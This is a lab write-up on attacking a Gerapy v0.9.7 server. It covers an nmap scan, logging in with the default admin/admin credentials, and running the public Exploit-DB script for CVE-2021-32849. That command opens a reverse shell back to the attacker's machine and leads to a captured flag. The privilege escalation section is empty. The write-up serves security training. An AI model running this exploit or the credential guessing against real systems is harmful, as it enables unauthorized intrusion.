

# About

This lab teaches exploiting an authenticated Remote Code Execution (RCE) vulnerability in Gerapy v0.9.7 (CVE-2021-32849) to gain a foothold as the app user. Privilege escalation is achieved using two methods: leveraging Python capabilities to gain root access and exploiting misconfigured systemd unit files containing plaintext root credentials. This lab demonstrates authenticated RCE exploitation, binary capabilities abuse, and service misconfiguration for privilege escalation.

## Skills Being Worked On

This lab conducts web enumeration to identify vulnerabilities, specifically focusing on exploiting CVE-2021-32849 and CVE-2021-43857. 

# Information Gathering 

Nmap Scan Results:

Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-12 22:57 -0400
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 22:57
Completed NSE at 22:57, 0.00s elapsed
Initiating NSE at 22:57
Completed NSE at 22:57, 0.00s elapsed
Initiating NSE at 22:57
Completed NSE at 22:57, 0.00s elapsed
Initiating Ping Scan at 22:57
Scanning 192.168.104.24 [4 ports]
Completed Ping Scan at 22:57, 0.16s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:57
Completed Parallel DNS resolution of 1 host. at 22:57, 0.52s elapsed
Initiating SYN Stealth Scan at 22:57
Scanning 192.168.104.24 [65535 ports]
Discovered open port 22/tcp on 192.168.104.24
Discovered open port 8000/tcp on 192.168.104.24
Completed SYN Stealth Scan at 22:58, 59.56s elapsed (65535 total ports)
Initiating Service scan at 22:58
Scanning 2 services on 192.168.104.24
Completed Service scan at 22:59, 6.46s elapsed (2 services on 1 host)
NSE: Script scanning 192.168.104.24.
Initiating NSE at 22:59
Completed NSE at 22:59, 2.59s elapsed
Initiating NSE at 22:59
Completed NSE at 22:59, 0.20s elapsed
Initiating NSE at 22:59
Completed NSE at 22:59, 0.00s elapsed
Nmap scan report for 192.168.104.24
Host is up (0.065s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
|_http-title: Gerapy
| http-methods: 
|_  Supported Methods: OPTIONS GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


Available ports ==22, 8000== 


Running on port 8000 we have a login site for "Gerapy." 

Since the available information only shows a login screen, we can try to find more information about this software and run a gobuster subdomain search in parallel.

Gobuster results:

The gobuster results for this site failed, but were able to find an "admin" login subdomain.

After social engineering attempts, the password username combo: "admin/admin" worked for access to the site login page:

Username: admin
Password: admin

# Foothold

Following research on the Gerapy platform, we are able to find a known remote code execution (RCE) exploit on Exploit DB that will allow us to gain a foot hold on the targeted machine.

The use of this script allow us to set the parameters for a reverse shell on our local machine after creating a local project on gerapy. The exploit can be found here at the available Exploit Db link -> https://www.exploit-db.com/exploits/50640

The command for the relevant exploit can be found below:

		python3 50640.py -t 192.168.104.24 -p 8000 -L 192.168.XXX.XXX -P 443

With a listener set up on our local host on port 443, we achieve our foothold on the target machine and find our first flag in the home directory:

app@ubuntu:~$ cat local.txt
cat local.txt
==0fa9a8213fd1aac4e63a04f268fdb5cc==

# Privilege Escalation
















